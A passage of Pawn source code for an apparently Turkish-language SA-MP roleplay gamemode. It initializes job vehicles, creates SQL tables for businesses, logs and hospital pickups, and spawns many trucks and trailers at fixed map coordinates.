	print("GameModeInIt_VehiclesPickups 1");
	// Add busses to all bus-depots
	GameModeInit_Busses();
	print("GameModeInIt_VehiclesPickups 2");
	// Add busstops to the map
	GameModeInit_Busstops();
	print("GameModeInIt_VehiclesPickups 3");
	// Add police vehicles to the Police Impounds
	GameModeInit_Police();
	print("GameModeInIt_VehiclesPickups 4");
	// Add mafia vehicles to the mafia hideoue
	GameModeInit_Mafia();
	print("GameModeInIt_VehiclesPickups 5");
	// Add planes and helicopters to the airports
	GameModeInit_Airports();
	print("GameModeInIt_VehiclesPickups 6");
	// Add dozers for roadworker class
	GameModeInit_RoadWorker();
	print("GameModeInIt_VehiclesPickups 7");
	// Add boats for gemici class pls
	GameModeInit_Gemici();
	print("GameModeInIt_VehiclesPickups 8");
	// Add vehicles, kesim zones, satis zones for oduncu class
	GameModeInit_Oduncu();
	print("GameModeInIt_VehiclesPickups 9");
	// Add boats for balikci class pls
	GameModeInit_Balikci();
	print("GameModeInIt_VehiclesPickups 10");
		// pizzacar
	GameModeInit_Pboy();
    print("GameModeInIt_VehiclesPickups 11");
	// copcu
	GameModeInit_Copcu();
	print("GameModeInIt_VehiclesPickups 12");
	// banka
	GameModeInit_Banka();
    print("GameModeInIt_VehiclesPickups 13");
	// banka
	GameModeInit_Fire();
    print("GameModeInIt_VehiclesPickups 14");
		// Kargocu
	GameModeInit_Kargocu();
	print("GameModeInIt_VehiclesPickups 15");
	
	// Dolmuþ
	GameModeInit_Dolmus();
	print("GameModeInIt_VehiclesPickups 16");
	// Add some special pickups
	GameModeInit_PickupsIcons();
	print("GameModeInIt_VehiclesPickups 17");

	// Add all objects required for toll-gates
	GameModeInit_Toll();
    print("GameModeInIt_VehiclesPickups 18");
	// Load all houses and create pickups and 3dTexts for them
	Housing_LoadAll();
	print("GameModeInIt_VehiclesPickups 19");
	// Load all speedcameras
	Camera_LoadAll();
	print("GameModeInIt_VehiclesPickups 20");
	// Load all businesses and start the business timer (runs every hour)
	new handle;
	if(!SQL::ExistsTable("isyerleri"))
    {
        handle = SQL::Open(SQL::CREATE, "isyerleri");
        SQL::AddTableColumn(handle, "ID", SQL_TYPE_INT, 11);
        SQL::AddTableColumn(handle, "Isim", SQL_TYPE_VCHAR, 100);
        SQL::AddTableColumn(handle, "X", SQL_TYPE_FLOAT, 20);
        SQL::AddTableColumn(handle, "Y", SQL_TYPE_FLOAT, 20);
        SQL::AddTableColumn(handle, "Z", SQL_TYPE_FLOAT, 20);
		SQL::AddTableColumn(handle, "Type", SQL_TYPE_INT);
		SQL::AddTableColumn(handle, "Level", SQL_TYPE_INT);
		SQL::AddTableColumn(handle, "Kasa", SQL_TYPE_INT);
		SQL::AddTableColumn(handle, "Sahipli", SQL_TYPE_INT);
		SQL::AddTableColumn(handle, "Sahip", SQL_TYPE_VCHAR, 40);
        SQL::Close(handle);

        printf("'isyerleri' tablosu olusturuldu.");
    }
	Business_LoadAll();

	if(!SQL::ExistsTable("Logs"))
    {
        handle = SQL::Open(SQL::CREATE, "Logs");
        SQL::AddTableColumn(handle, "logID", SQL_TYPE_INT, 11, true);
        SQL::AddTableColumn(handle, "logPlayer", SQL_TYPE_VCHAR, 40);
        SQL::AddTableColumn(handle, "logType", SQL_TYPE_INT);
        SQL::AddTableColumn(handle, "logText", SQL_TYPE_VCHAR, 100);
        SQL::Close(handle);

        printf("'Logs' tablosu olusturuldu.");
    }
	
	if(!SQL::ExistsTable("HastanePickups"))
    {
        handle = SQL::Open(SQL::CREATE, "HastanePickups");
        SQL::AddTableColumn(handle, "PickupID", SQL_TYPE_INT, 11);
        SQL::AddTableColumn(handle, "EnterX", SQL_TYPE_FLOAT, 20);
        SQL::AddTableColumn(handle, "EnterY", SQL_TYPE_FLOAT, 20);
        SQL::AddTableColumn(handle, "EnterZ", SQL_TYPE_FLOAT, 20);
        SQL::AddTableColumn(handle, "VirtualWorld", SQL_TYPE_INT, 20);
        SQL::Close(handle);

        printf("'HastanePickups' tablosu olusturuldu.");
    }
	//SetTimer("Business_TransactionTimer", 1000 * 60 * 60, true);

	// Print the LastVehicleID to the server's console
	format(LastVehicleMsg, 100, TXT_LastVehicleID, LastVehicleID);
	format(LastObjectMsg, 100, TXT_LastObjectID, LastObjectID);
	format(LastHouseMsg, 100, TXT_TotalHouses, TotalHouses);
	format(LastBusinessMsg, 100, TXT_TotalBusiness, TotalBusiness);
	format(LastCameraMsg, 100, TXT_TotalSpeedCameras, TotalCameras);
	print(TXT_DebugInfo);
	print("-------------------------------------");
	print(LastVehicleMsg);
	print(LastObjectMsg);
	print(LastHouseMsg);
	print(LastBusinessMsg);
	print(LastCameraMsg);
	print("-------------------------------------");
}


GameModeInit_TruckDepots()
{
	LastVehicleID = Vehicle_AddStatic(435,1807.5996000,-2028.4004000,14.2000000,90.0000000,100,100,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,1807.7002000,-2021.5000000,14.2000000,90.0000000,100,100,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,1807.7002000,-2025.0000000,14.2000000,90.0000000,100,100,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(584,1806.8000000,-2045.6000000,14.7000000,90.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,1806.6000000,-2048.8999000,14.7000000,90.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,1806.4004000,-2052.0000000,14.7000000,90.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(455,1775.5000000,-2075.2002000,14.2000000,270.0000000,100,100,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,1765.5996000,-2075.3994000,14.2000000,270.0000000,100,100,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(515,1758.2002000,-2059.2998000,14.7000000,180.0000000,100,100,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(450,1736.2002000,-2074.0996000,14.3000000,270.0000000,100,100,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,1736.2002000,-2070.5000000,14.3000000,270.0000000,100,100,600); //Trailer 2

	LastVehicleID = Vehicle_AddStatic(455,-471.7999900,-506.2999900,26.1000000,87.9950000,100,100,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,-471.7000100,-522.2000100,26.1000000,87.9950000,100,100,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,-472.1000100,-514.7999900,26.1000000,87.9950000,100,100,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(403,-470.0000000,-473.2999900,26.2000000,179.2420000,100,100,600); //Linerunner
	LastVehicleID = Vehicle_AddStatic(515,-529.7000100,-473.3999900,26.7000000,178.5000000,100,100,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-536.5000000,-501.0000000,26.7000000,359.4840000,100,100,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-539.5999800,-473.5000000,26.7000000,178.4890000,100,100,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-544.0999800,-500.6000100,26.7000000,359.0000000,100,100,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-564.0000000,-473.8999900,26.7000000,180.4840000,100,100,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-550.7000100,-500.8999900,26.7000000,358.4840000,100,100,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(578,-472.1000100,-498.1000100,26.3000000,87.9950000,100,100,600); //DFT-30
	LastVehicleID = Vehicle_AddStatic(435,-510.6000100,-500.6000100,25.6000000,0.0000000,100,100,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-506.5000000,-500.7000100,26.2000000,0.0000000,100,100,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-514.5000000,-500.5000000,26.2000000,0.0000000,100,100,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(450,-575.7002000,-500.4003900,26.2000000,0.0000000,100,100,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,-570.7000100,-500.1000100,26.2000000,0.0000000,100,100,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,-565.7000100,-500.7999900,26.2000000,0.0000000,100,100,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(584,-499.8999900,-473.2000100,26.7000000,180.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-519.7000100,-473.1000100,26.7000000,178.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-484.2999900,-473.2000100,26.7000000,180.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(455,-537.2000100,2572.1001000,54.0000000,270.0000000,45,92,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,-537.7000100,2567.1001000,54.0000000,270.0000000,45,92,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,-537.7000100,2562.0000000,54.0000000,270.0000000,45,92,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(515,-534.4003900,2622.7002000,54.6000000,270.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-534.4000200,2618.3000000,54.6000000,270.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(450,-518.0000000,2566.8000000,54.1000000,270.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,-518.4000200,2560.3000000,54.1000000,270.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,-518.2002000,2563.6006000,54.1000000,270.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(584,-510.3999900,2617.2000000,54.6000000,90.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(435,-509.2999900,2636.3999000,54.1000000,90.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(450,335.9003900,856.2998000,21.1000000,343.9980000,124,28,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,329.0000000,870.7000100,21.1000000,343.9980000,124,28,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,332.0000000,862.5999800,21.1000000,343.9980000,124,28,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,324.8999900,876.5000000,21.1000000,343.9980000,124,28,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(515,334.5000000,872.0000000,21.6000000,346.0000000,124,28,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,338.7998000,867.0000000,21.6000000,345.9980000,124,28,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,331.3999900,880.2999900,21.6000000,345.9980000,124,28,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,327.7000100,886.0000000,21.6000000,345.9980000,124,28,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(524,380.0996100,900.7002000,21.4000000,49.9990000,124,28,600); //Cement Truck
	LastVehicleID = Vehicle_AddStatic(524,382.0996100,910.5000000,22.3000000,49.9990000,124,28,600); //Cement Truck
	LastVehicleID = Vehicle_AddStatic(524,383.2999900,920.0000000,23.2000000,49.9990000,124,28,600); //Cement Truck
	LastVehicleID = Vehicle_AddStatic(435,-39.4000000,-1138.7000000,1.7000000,66.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-42.1000000,-1147.1000000,1.7000000,65.9950000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-41.2000000,-1142.6000000,1.7000000,65.9950000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-44.3000000,-1150.2000000,1.7000000,65.9950000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-46.0000000,-1153.9000000,1.7000000,65.9950000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(455,-66.9000000,-1156.9000000,2.3000000,65.9920000,45,92,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(584,-82.6000000,-1198.7000000,3.7000000,73.9980000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-80.7000000,-1191.6000000,2.9000000,73.9930000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-103.9000000,-1193.9000000,3.1000000,73.9930000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(515,-48.7000000,-1134.8000000,2.2000000,70.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-50.2000000,-1139.1000000,2.2000000,69.9940000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-55.2998000,-1150.0996000,2.2000000,69.9940000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-53.2998000,-1146.7002000,2.2000000,69.9940000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1393.2000000,1017.3000000,12.0000000,270.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1393.2000000,1027.2999000,12.0000000,270.0000000,98,68,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1393.2002000,1033.2998000,12.0000000,270.0000000,116,29,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1393.2000000,1043.3000000,12.0000000,270.0000000,115,10,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1393.2002000,1049.2998000,12.0000000,270.0000000,82,86,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1393.2000000,1060.2999000,12.0000000,270.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(450,1387.5000000,983.0000000,11.5000000,270.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(435,1406.0000000,975.5000000,11.5000000,0.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,1410.0000000,975.5000000,11.5000000,0.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,1414.0000000,975.5000000,11.5000000,0.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,1418.0000000,975.5000000,11.5000000,0.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,1430.0000000,975.5000000,11.5000000,0.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,1434.0000000,975.5000000,11.5000000,0.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,1438.0000000,975.5000000,11.5000000,0.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(584,1381.3000000,1091.3000000,12.0000000,180.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,1376.4000000,1091.2000000,12.0000000,180.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,1371.2000000,1091.0000000,12.0000000,180.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,1366.3000000,1090.8000000,12.0000000,180.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,1361.2998000,1090.7002000,12.0000000,180.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,1355.8000000,1090.7000000,12.0000000,180.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(515,1423.4004000,1062.7002000,12.0000000,90.0000000,115,10,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1423.4000000,1046.7000000,12.0000000,90.0000000,98,68,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1423.4000000,1024.7000000,12.0000000,90.0000000,115,10,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1423.4000000,1019.6999000,12.0000000,90.0000000,82,86,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(450,-2131.7998000,-261.4003900,36.0000000,0.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,-2127.7998000,-261.4003900,36.0000000,0.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,-2123.7998000,-261.3994100,36.0000000,0.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(584,-2099.0000000,-272.5996100,36.5000000,0.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-2103.0000000,-272.5996100,36.5000000,0.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-2107.0000000,-272.5996100,36.5000000,0.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-2111.0000000,-272.5996100,36.5000000,0.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(450,-2118.8000000,-261.3999900,36.0000000,0.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(435,-2101.7998000,-202.2002000,35.7999000,90.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-2101.8000000,-206.2000000,35.7999000,90.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-2101.8000000,-210.1999100,35.8000000,90.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-2101.7998000,-214.2002000,35.7999000,90.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(515,-2132.3000000,-231.7000000,36.5000000,270.0000000,82,86,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2169.6001000,-220.3000000,36.5000000,270.0000000,116,29,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2132.3000000,-236.7000000,36.5000000,270.0000000,95,39,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2132.3000000,-241.7000000,36.5000000,270.0000000,82,86,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(455,1386.4004000,1106.7002000,11.1000000,180.0000000,170,157,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,1386.5000000,1118.0000000,11.1000000,180.0000000,170,157,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,1386.5996000,1129.7998000,11.1000000,180.0000000,170,157,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,1386.5000000,1141.2998000,11.1000000,180.0000000,170,157,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,-2145.0000000,-185.2002000,35.6000000,269.7470000,170,157,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,-2144.7998000,-189.5000000,35.6000000,269.7420000,170,157,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,-2144.3000000,-198.6000100,35.6000000,269.7470000,170,157,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(455,-2144.7002000,-193.9003900,35.6000000,269.7420000,170,157,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(515,-997.2000100,779.7999900,24.9000000,290.4950000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-993.7000100,769.9000200,25.1000000,289.2450000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-989.9000200,760.2000100,25.4000000,290.9840000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-986.2999900,750.5000000,25.6000000,290.4950000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(435,-983.5000000,740.2998000,25.2000000,288.7480000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-980.0000000,730.5000000,25.2000000,288.7480000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-976.0000000,720.0000000,25.2000000,289.4980000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,-972.5999800,710.9000200,25.1000000,289.9980000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(584,-968.7000100,701.5999800,25.7000000,289.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-965.7000100,691.7000100,25.7000000,288.7430000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-962.0999800,682.0000000,25.7000000,288.7460000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-958.9000200,672.9000200,25.7000000,289.4950000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(450,-955.0000000,664.0000000,25.2000000,291.2500000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,-951.2999900,653.5000000,25.1000000,290.2480000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,-948.0999800,644.0999800,25.2000000,289.9950000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(435,1441.5000000,975.5000000,11.5000000,0.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(450,1402.0000000,975.2999900,11.5000000,0.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,1387.5000000,986.4000200,11.5000000,270.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,1387.4000000,989.9000200,11.5000000,270.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,1387.5000000,993.7999900,11.5000000,270.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,1387.5000000,997.5000000,11.5000000,270.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,1397.8000000,975.2999900,11.5000000,0.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,1387.6000000,1001.2000000,11.5000000,270.0000000,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(515,1382.4000000,1055.0000000,12.0000000,270.0000000,82,86,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1381.9000000,1038.6000000,12.0000000,270.0000000,82,86,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1382.2000000,1022.2000000,12.0000000,270.0000000,82,86,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1423.5000000,1057.7000000,12.0000000,90.0000000,115,10,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1423.4000000,1052.1000000,12.0000000,90.0000000,115,10,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(450,1807.7000000,-2034.7000000,14.3000000,90.0000000,100,100,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(515,1762.7000000,-2059.3000000,14.7000000,180.0000000,100,100,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,1767.1000000,-2059.2000000,14.7000000,182.0000000,100,100,600); //Roadtrain

	LastVehicleID = Vehicle_AddStatic(515,-534.4000200,2627.2000000,54.6000000,270.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(435,-509.6000100,2625.8000000,54.1000000,90.0000000,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(584,-510.5000000,2605.7000000,54.6000000,90.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(455,-69.2000000,-1161.7000000,2.3000000,65.9890000,45,92,600); //Flatbed
	LastVehicleID = Vehicle_AddStatic(515,-2132.2998000,-226.7002000,36.5000000,270.0000000,116,29,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2169.6001000,-215.2000000,36.5000000,270.0000000,116,29,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2169.6001000,-209.8000000,36.5000000,270.0000000,116,29,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2169.6001000,-204.5000000,36.5000000,270.0000000,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2533.6453, 4906.3604, 31.9922, 74.2822,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2530.3977, 4901.1040, 31.9922, 75.1222,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2526.8635, 4896.9399, 31.9922, 75.1222,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2524.6279, 4892.9854, 31.9922, 75.1222,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2533.3408, 4924.1250, 31.9922, 81.3963,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2536.2129, 4932.6978, 31.9922, 81.3963,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2537.5037, 4942.4702, 31.9922, 81.3963,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2538.0208, 4952.4434, 31.9922, 81.3963,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2449.1121, 4924.8496, 32.4641, 198.7062,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2454.4973, 4924.3760, 32.4641, 199.4262,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2459.7075, 4924.5732, 32.4641, 199.7262,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2464.9441, 4924.1387, 32.4641, 199.7262,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2470.2217, 4924.1235, 32.4641, 199.7262,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2475.5613, 4925.0747, 32.4641, 198.2665,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2480.3254, 4925.5054, 32.4641, 197.6065,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2485.6516, 4924.7168, 32.4641, 197.6065,116,29,600); //Roadtrain
    LastVehicleID = Vehicle_AddStatic(515,2490.6001, 4924.3794, 32.4641, 197.6065,116,29,600); //Roadtrain

	LastVehicleID = Vehicle_AddStatic(584,2445.8723, 4934.9600, 32.2380, 196.9239,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,2450.9424, 4934.2690, 32.2380, 196.9239,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,2456.4048, 4934.2314, 32.2380, 196.9239,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,2461.6206, 4934.1226, 32.2380, 196.9239,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,2466.9229, 4934.2300, 32.2380, 196.3239,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-510.5000000,2611.3000000,54.6000000,90.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-510.5000000,2611.3000000,54.6000000,90.0000000,45,92,600); //Trailer 3
	LastVehicleID = Vehicle_AddStatic(584,-510.5000000,2611.3000000,54.6000000,90.0000000,45,92,600); //Trailer 3

	LastVehicleID = Vehicle_AddStatic(450,2472.5642, 4934.4385, 31.7583, 197.8364,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,2477.4106, 4934.5840, 31.7583, 196.3364,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,2482.8040, 4933.9175, 31.7583, 195.1964,45,92,600); //Trailer 2
	LastVehicleID = Vehicle_AddStatic(450,2488.0278, 4933.5708, 31.7583, 195.1964,45,92,600); //Trailer 2

	LastVehicleID = Vehicle_AddStatic(435,2544.7375, 4931.5771, 31.5985, 81.6970,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,2545.8911, 4941.4146, 31.5985, 83.1970,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,2546.7412, 4951.3643, 31.5985, 83.1970,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,2542.0249, 4922.8975, 31.5985, 81.6970,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,2542.1655, 4903.7725, 31.5985, 74.2873,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,2539.0918, 4898.6514, 31.5985, 76.3273,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,2535.7769, 4894.5859, 31.5985, 76.6873,45,92,600); //Trailer 1
	LastVehicleID = Vehicle_AddStatic(435,2533.7012, 4890.7837, 31.5985, 76.6873,45,92,600); //Trailer 1

	// Higawy

    LastVehicleID = Vehicle_AddStatic(450,-1515.6133000,-2791.1775000,49.0478000,54.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(515,-1587.8928000,-2701.0093000,49.5558000,170.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(450,-1513.3275000,-2788.1274000,49.0478000,53.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(450,-1510.9885000,-2784.9321000,49.0478000,54.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(450,-1508.8312000,-2781.7747000,49.0478000,54.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(435,-1523.2067000,-2746.5508000,49.0558000,132.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(435,-1525.4688000,-2743.9712000,49.0558000,132.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(435,-1527.8369000,-2741.3303000,49.0558000,132.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(435,-1530.1251000,-2738.7866000,49.0558000,132.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(435,-1532.5646000,-2736.1655000,49.0558000,134.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(435,-1545.5311000,-2724.1533000,49.0558000,140.0000000,-1,-1,15);
	LastVehicleID = Vehicle_AddStatic(455,-1595.6038000,-2696.3789000,49.0558000,160.0000000,-1,-1,15);
